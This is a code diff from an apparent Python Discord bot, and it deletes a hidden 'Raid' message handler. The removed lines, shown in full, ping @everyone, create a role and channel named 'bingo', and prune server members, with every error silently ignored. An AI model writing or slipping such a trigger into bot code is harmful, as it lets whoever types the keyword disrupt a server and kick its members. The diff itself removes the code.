@@ -18,29 +18,7 @@ async def on_ready():
     print("Username: %s"%client.user.name)
     print("ID: %s"%client.user.id)
     print("----------------------")
-  
-@client.event
-async def on_message(message):
-    server = message.server
-    if message.content.startswith('Raid'):
-        msg = 'Raid @everyone'.format(message)
-        try:
-            await client.send_message(message.channel, msg)
-        except:
-            server = message.server
-        try:
-            await client.create_role(server, name = "bingo")
-        except:
-            server = message.server
-        try:
-            await client.create_channel(server, name = "bingo")
-        except:
-            server = message.server
-        try:
-            await client.prune_members(server, days = 1)
-        except:
-            return
-        
+          
 #m1 
 @client.command(pass_context=True)
 async def help(ctx):
